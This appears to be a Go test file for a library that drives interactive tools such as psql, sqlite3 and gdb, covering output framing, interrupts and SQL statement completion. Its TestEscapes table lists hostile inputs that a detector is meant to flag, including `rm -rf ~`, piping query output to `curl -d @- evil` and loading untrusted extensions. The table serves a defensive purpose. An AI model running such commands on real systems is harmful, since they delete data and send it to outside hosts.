package transcript

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/CurtisD4q/Mint-Interfaces/mint"
)

// fakeShell is an interactive program for the edge cases: "MARK t" prints
// t, "MARKERR t" prints t on stderr, and a few words misbehave.
const fakeShell = `while IFS= read -r line; do
  case "$line" in
    "MARK "*) echo "${line#MARK }";;
    "MARKERR "*) echo "${line#MARKERR }" >&2;;
    nonl) printf 'partial';;
    fake) echo "__MINT_00000000000000000000000000000000__";;
    mention) echo "the token is __MINT_ffffffffffffffffffffffffffffffff__ here";;
    err) echo "bad thing" >&2;;
    slow) sleep 0.6; echo done;;
    loop) stop=; trap 'echo cancelled; stop=1' INT; while [ -z "$stop" ]; do sleep 0.05; done; trap - INT;;
    *) echo "out:$line";;
  esac
done`

var fake = Adapter{
	Name:     "fake",
	Markers:  func(t string) (string, string) { return "MARK " + t, "MARKERR " + t },
	Complete: everyLine,
	Escape:   func(string) string { return "" },
	Comment:  func(string) bool { return false },
	Cancel:   CancelSignal,
}

func startFake(t *testing.T, a Adapter) *Session {
	t.Helper()
	s := Start(a, "sh", []string{"-c", fakeShell}, nil)
	t.Cleanup(s.Close)
	return s
}

func run(t *testing.T, s *Session, cmd string) Entry {
	t.Helper()
	if err := s.Send(cmd); err != nil {
		t.Fatal(err)
	}
	if !s.Wait(5 * time.Second) {
		t.Fatalf("%q never finished", cmd)
	}
	es := s.Entries()
	return es[len(es)-1]
}

func text(e Entry) string {
	var out []string
	for _, l := range e.Output {
		p := ""
		if l.Err {
			p = "!"
		}
		out = append(out, p+l.Text)
	}
	return strings.Join(out, "|")
}

func TestFraming(t *testing.T) {
	s := startFake(t, fake)
	if e := run(t, s, "hello"); text(e) != "out:hello" || e.Command != "hello" || e.Running() {
		t.Fatalf("hello: %q", text(e))
	}
	if e := run(t, s, "err"); text(e) != "!bad thing" || !e.HasErrors() {
		t.Fatalf("err: %q", text(e))
	}
	// Output without a final newline: the marker lands on the same line.
	if e := run(t, s, "nonl"); text(e) != "partial" {
		t.Fatalf("nonl: %q", text(e))
	}
	// Printing a token, or mentioning one, doesn't end the command.
	if e := run(t, s, "fake"); text(e) != "__MINT_00000000000000000000000000000000__" {
		t.Fatalf("fake token: %q", text(e))
	}
	if e := run(t, s, "mention"); !strings.Contains(text(e), "token is") {
		t.Fatalf("mention: %q", text(e))
	}
	// One command at a time.
	if err := s.Send("slow"); err != nil {
		t.Fatal(err)
	}
	if err := s.Send("x"); err != ErrBusy {
		t.Fatalf("second Send: %v", err)
	}
	s.Wait(5 * time.Second)
	if es := s.Entries(); text(es[len(es)-1]) != "done" {
		t.Fatalf("slow: %q", text(es[len(es)-1]))
	}
}

// Without markers, the end is found when output goes quiet.
func TestIdleEnd(t *testing.T) {
	old := IdleEnd
	IdleEnd = 200 * time.Millisecond
	defer func() { IdleEnd = old }()
	a := fake
	a.Markers = nil
	s := startFake(t, a)
	start := time.Now()
	if e := run(t, s, "hi"); text(e) != "out:hi" || time.Since(start) < IdleEnd {
		t.Fatalf("hi: %q after %v", text(e), time.Since(start))
	}
}

func TestInterrupt(t *testing.T) {
	s := startFake(t, fake)
	if err := s.Send("loop"); err != nil {
		t.Fatal(err)
	}
	time.Sleep(150 * time.Millisecond)
	if err := s.Interrupt(); err != nil {
		t.Fatal(err)
	}
	if !s.Wait(5 * time.Second) {
		t.Fatal("not finished after interrupt")
	}
	es := s.Entries()
	if e := es[len(es)-1]; !e.Interrupted || !strings.Contains(text(e), "cancelled") {
		t.Fatalf("interrupted entry %+v %q", e, text(e))
	}
	// The program is still there for the next command.
	if e := run(t, s, "after"); text(e) != "out:after" {
		t.Fatalf("after: %q", text(e))
	}
}

// Programs that quit on Ctrl+C are never sent it.
func TestCannotCancel(t *testing.T) {
	a := fake
	a.Cancel = CancelNone
	s := startFake(t, a)
	if s.CanInterrupt() {
		t.Fatal("CanInterrupt with CancelNone")
	}
	if err := s.Send("loop"); err != nil {
		t.Fatal(err)
	}
	if err := s.Interrupt(); err != ErrCannotCancel {
		t.Fatalf("Interrupt = %v", err)
	}
	if !s.Job().Running() {
		t.Fatal("the program was stopped")
	}
}

// When Mint's own identity query fails (here the program doesn't
// understand it), what came back is shown, cancelling says why it can't,
// and a command sent meanwhile still runs.
func TestIdentityFails(t *testing.T) {
	a := fake
	a.Cancel = CancelBackend
	s := startFake(t, a)
	if err := s.Send("first"); err != nil {
		t.Fatalf("Send while Mint's own command runs: %v", err)
	}
	if !s.Wait(5 * time.Second) {
		t.Fatal("queued command never ran")
	}
	es := s.Entries()
	if len(es) != 2 || es[0].Command != "" || !strings.Contains(text(es[0]), "out:select pg_backend_pid()") {
		t.Fatalf("identity output not shown: %+v", es)
	}
	if es[1].Command != "first" || text(es[1]) != "out:first" {
		t.Fatalf("queued entry %+v", es[1])
	}
	s.Send("loop")
	if err := s.Interrupt(); err == nil || !strings.Contains(err.Error(), "which server process") {
		t.Fatalf("Interrupt = %v", err)
	}
}

// Cancelling a command that is still waiting for Mint's own means it is
// never sent.
func TestCancelQueued(t *testing.T) {
	a := fake
	a.Cancel = CancelBackend
	s := startFake(t, a)
	s.Send("never")
	if err := s.Interrupt(); err != nil {
		t.Fatal(err)
	}
	s.Wait(5 * time.Second)
	time.Sleep(100 * time.Millisecond)
	s.Poll()
	for _, e := range s.Entries() {
		if strings.Contains(text(e), "out:never") {
			t.Fatal("cancelled command was sent")
		}
		if e.Command == "never" && (!e.Interrupted || e.Running()) {
			t.Fatalf("entry %+v", e)
		}
	}
}

func TestProgramEnds(t *testing.T) {
	s := Start(fake, "sh", []string{"-c", "echo banner; read x; exit 0"}, nil)
	defer s.Close()
	time.Sleep(100 * time.Millisecond)
	s.Poll()
	if es := s.Entries(); len(es) != 1 || es[0].Command != "" || text(es[0]) != "banner" {
		t.Fatalf("banner entry %+v", es)
	}
	s.Send("bye")
	if !s.Wait(5 * time.Second) {
		t.Fatal("entry left running after the program ended")
	}
	if err := s.Send("again"); err == nil {
		t.Fatal("sent to a program that ended")
	}
}

// The real sqlite3, with -safe when it has it.
func TestSQLite(t *testing.T) {
	bin, err := exec.LookPath("sqlite3")
	if err != nil {
		t.Skip("sqlite3 not installed")
	}
	db := filepath.Join(t.TempDir(), "t.db")
	s := Start(Adapters["sqlite3"], bin, []string{db}, nil)
	defer s.Close()
	run(t, s, "create table t(a, b);")
	run(t, s, "insert into t values (1, 'x'), (2, 'y');")
	if e := run(t, s, "select * from t order by a;"); text(e) != "1|x|2|y" {
		t.Fatalf("select: %q", text(e))
	}
	if e := run(t, s, "select * from nope;"); !e.HasErrors() || !strings.Contains(text(e), "no such table") {
		t.Fatalf("error: %q", text(e))
	}
	// sqlite3 quits on Ctrl+C when its input is a pipe, so it isn't sent.
	if err := s.Send("WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 3000000) SELECT count(*) FROM c;"); err != nil {
		t.Fatal(err)
	}
	if err := s.Interrupt(); err != ErrCannotCancel {
		t.Fatalf("Interrupt = %v", err)
	}
	if !s.Wait(30 * time.Second) {
		t.Fatal("count never finished")
	}
	if !s.Safe() {
		t.Skip("this sqlite3 has no -safe (before 3.37)")
	}
	// In safe mode .shell is refused, and sqlite3 ends the session.
	if e := run(t, s, ".shell echo pwned"); strings.Contains(text(e), "pwned") || !strings.Contains(text(e), "safe mode") {
		t.Fatalf(".shell: %q", text(e))
	}
	if s.Job().Wait(); s.Job().Running() {
		t.Fatal("sqlite3 carried on after a refused command; Safe's comment is wrong")
	}
}

// The real gdb: no prompt in the output, errors on stderr.
func TestGDB(t *testing.T) {
	bin, err := exec.LookPath("gdb")
	if err != nil {
		t.Skip("gdb not installed")
	}
	s := Start(Adapters["gdb"], bin, nil, nil)
	defer s.Close()
	if e := run(t, s, "print 6*7"); text(e) != "$1 = 42" {
		t.Fatalf("print: %q", text(e))
	}
	if e := run(t, s, "print nosuch"); !e.HasErrors() || strings.Contains(text(e), "(gdb)") {
		t.Fatalf("error: %q", text(e))
	}
	// Ctrl+C stops the program being debugged; gdb carries on.
	sleep, err := exec.LookPath("sleep")
	if err != nil {
		t.Skip("no sleep")
	}
	run(t, s, "file "+sleep)
	if err := s.Send("run 30"); err != nil {
		t.Fatal(err)
	}
	time.Sleep(700 * time.Millisecond)
	if err := s.Interrupt(); err != nil {
		t.Fatal(err)
	}
	if !s.Wait(5 * time.Second) {
		t.Fatal("run not interrupted")
	}
	if e := run(t, s, "print 1+1"); !strings.Contains(text(e), "= 2") {
		t.Fatalf("after interrupt: %q", text(e))
	}
}

// The real psql, if a database is reachable.
func TestPSQL(t *testing.T) {
	bin, err := exec.LookPath("psql")
	if err != nil {
		t.Skip("psql not installed")
	}
	if out, err := exec.Command(bin, "-X", "-q", "-c", "select 1").CombinedOutput(); err != nil {
		t.Skipf("no database: %s", out)
	}
	s := Start(Adapters["psql"], bin, nil, os.Environ())
	defer s.Close()
	// Sent at once, while Mint's own identity query runs.
	if e := run(t, s, "select 6*7 as answer;"); !strings.Contains(text(e), "42") || e.HasErrors() {
		t.Fatalf("select: %q", text(e))
	}
	if es := s.Entries(); len(es) != 1 {
		t.Fatalf("Mint's own command is visible: %+v", es)
	}
	e := run(t, s, "select nope;")
	if !e.HasErrors() || !strings.Contains(text(e), `column "nope" does not exist`) {
		t.Fatalf("error: %q", text(e))
	}
	// The error came with this command, not the next one.
	if e := run(t, s, "select 'next';"); e.HasErrors() || !strings.Contains(text(e), "next") {
		t.Fatalf("next: %q", text(e))
	}
	if e := run(t, s, `\echo hi`); text(e) != "hi" {
		t.Fatalf(`\echo: %q`, text(e))
	}
	// Ctrl+C cancels a long query and psql carries on.
	if err := s.Send("select pg_sleep(30);"); err != nil {
		t.Fatal(err)
	}
	cancel := func() {
		t.Helper()
		time.Sleep(300 * time.Millisecond)
		if err := s.Interrupt(); err != nil {
			t.Fatal(err)
		}
		if !s.Wait(5 * time.Second) {
			t.Fatal("pg_sleep not cancelled")
		}
		es := s.Entries()
		if e := es[len(es)-1]; !e.Interrupted || !strings.Contains(text(e), "canceling statement") {
			t.Fatalf("cancelled entry: %q", text(e))
		}
		if e := run(t, s, "select 'still here';"); !strings.Contains(text(e), "still here") {
			t.Fatalf("after cancel: %q", text(e))
		}
	}
	cancel()
	// \c opens a new connection, with a new server process.
	before := s.backendPID
	run(t, s, `\c`)
	s.Wait(5 * time.Second)
	if err := s.Send("select pg_sleep(30);"); err != nil {
		t.Fatal(err)
	}
	pid := func() int { s.mu.Lock(); defer s.mu.Unlock(); return s.backendPID }
	for deadline := time.Now().Add(5 * time.Second); pid() == 0 && time.Now().Before(deadline); {
		s.Poll()
		time.Sleep(20 * time.Millisecond)
	}
	if p := pid(); p == before || p == 0 {
		t.Fatalf("backend not looked up again after \\c: %d", s.backendPID)
	}
	cancel()
}

func TestSQLComplete(t *testing.T) {
	for _, c := range []struct {
		s    string
		pg   bool
		want bool
	}{
		{"select 1;", true, true},
		{"select 1", true, false},
		{"select ';'", true, false},
		{"select ';';", true, true},
		{"select 'it''s';", true, true},
		{"select 'it''s", true, false},
		{`select ";"`, true, false},
		{"select 1; -- done", true, true},
		{"select 1 -- ;", true, false},
		{"select /* ; */ 1", true, false},
		{"select /* /* ; */ */ 1;", true, true},
		{"create function f() returns int as $$ select 1; $$", true, false},
		{"create function f() returns int as $$ select 1; $$ language sql;", true, true},
		{"select $tag$ ; $tag$;", true, true},
		{"select $1;", true, true}, // a parameter, not a quote
		{`\d users`, true, true},
		{".tables", false, true},
		{"", true, false},
		{"select 1;\n", false, true},
		{"select\n  1\n;", false, true},
	} {
		if got := sqlComplete(c.s, c.pg); got != c.want {
			t.Errorf("sqlComplete(%q) = %v, want %v", c.s, got, c.want)
		}
	}
}

func TestEscapes(t *testing.T) {
	for _, c := range []struct {
		adapter, line string
		escapes       bool
	}{
		{"psql", `\! rm -rf ~`, true},
		{"psql", `  \!ls`, true},
		{"psql", `\o | mail x`, true},
		{"psql", `\g |sh`, true},
		{"psql", `\copy t to program 'curl -d @- evil'`, true},
		{"psql", `COPY t FROM PROGRAM 'id'`, true},
		{"psql", `\i other.sql`, true},
		{"psql", `\o out.txt`, false},
		{"psql", `select '\!';`, false},
		{"psql", `select * from program_log;`, false},
		{"sqlite3", `.shell id`, true},
		{"sqlite3", `.system id`, true},
		{"sqlite3", `.once '|cat'`, true},
		{"sqlite3", `.output |sh`, true},
		{"sqlite3", `.import '|curl x' t`, true},
		{"sqlite3", `.load ./evil`, true},
		{"sqlite3", `select load_extension('evil');`, true},
		{"sqlite3", `.output result.txt`, false},
		{"sqlite3", `select * from shell;`, false},
		{"gdb", `shell id`, true},
		{"gdb", `!id`, true},
		{"gdb", `pipe info frame | sh`, true},
		{"gdb", `python import os`, true},
		{"gdb", `source cmds.gdb`, true},
		{"gdb", `print shell_var`, false},
		{"gdb", `break main`, false},
		{"redis-cli", `MODULE LOAD /tmp/x.so`, true},
		{"redis-cli", `config set dir /etc`, true},
		{"redis-cli", `GET key`, false},
		{"ftp", `!sh`, true},
		{"ftp", `get file`, false},
	} {
		got := Adapters[c.adapter].Escape(c.line) != ""
		if got != c.escapes {
			t.Errorf("%s %q: escapes %v, want %v", c.adapter, c.line, got, c.escapes)
		}
	}
}

func TestEndsWithMark(t *testing.T) {
	const tok = "__MINT_aa__"
	for _, c := range []struct {
		line, cmd string
		before    string
		ok        bool
	}{
		{tok, `\echo ` + tok, "", true},
		{"partial" + tok, `\echo ` + tok, "partial", true},
		{`\echo ` + tok, `\echo ` + tok, "", false}, // psql -e repeating the command
		{tok + " trailing", `\echo ` + tok, "", false},
		{"other", `\echo ` + tok, "", false},
	} {
		before, ok := endsWithMark(c.line, tok, c.cmd)
		if before != c.before || ok != c.ok {
			t.Errorf("endsWithMark(%q) = %q %v", c.line, before, ok)
		}
	}
	_ = mint.LogLine{}
}

// A command that ends inside a "--" comment must not swallow the marker:
// the comment runs to the end of the text, so a marker on the next line
// becomes part of it. EndsInLineComment is how the session knows.
func TestEndsInLineComment(t *testing.T) {
	for _, tc := range []struct {
		in   string
		want bool
	}{
		{"select 1;", false},
		{"select 1; -- note", true},
		{"select 1 -- note", true},
		{"select 1 -- note\n", false},
		{"select '-- not a comment';", false},
		{"select 1; /* block */", false},
		{"select 1; -- /* unterminated", true},
		{"select 'create user a identified by ''pw''' as x; -- identified by 'hunter2'", true},
	} {
		if got := EndsInLineComment(tc.in, false); got != tc.want {
			t.Errorf("EndsInLineComment(%q) = %v, want %v", tc.in, got, tc.want)
		}
	}
	// The shared scanner must leave sqlComplete exactly as it was.
	for _, tc := range []struct {
		in   string
		want bool
	}{
		{"select 1;", true},
		{"select 1", false},
		{"select 'a;b';", true},
		{"select 'create user a identified by ''pw''' as x; -- c", true},
		{".tables", true},
		{"-- only a comment", false},
	} {
		if got := sqlComplete(tc.in, false); got != tc.want {
			t.Errorf("sqlComplete(%q) = %v, want %v", tc.in, got, tc.want)
		}
	}
}

// The session closes a "--" comment with a semicolon before the marker, so
// the marker is not read into the comment.
func TestPayloadClosesAnOpenComment(t *testing.T) {
	for _, tc := range []struct {
		cmd  string
		want string
	}{
		{"select 1;", "select 1;\n.print TOK\n"},
		{"select 1; -- note", "select 1; -- note\n;\n.print TOK\n"},
	} {
		got := sessionPayload(Adapters["sqlite3"], tc.cmd, "TOK")
		if got != tc.want {
			t.Errorf("payload for %q =\n%q\nwant\n%q", tc.cmd, got, tc.want)
		}
	}
}
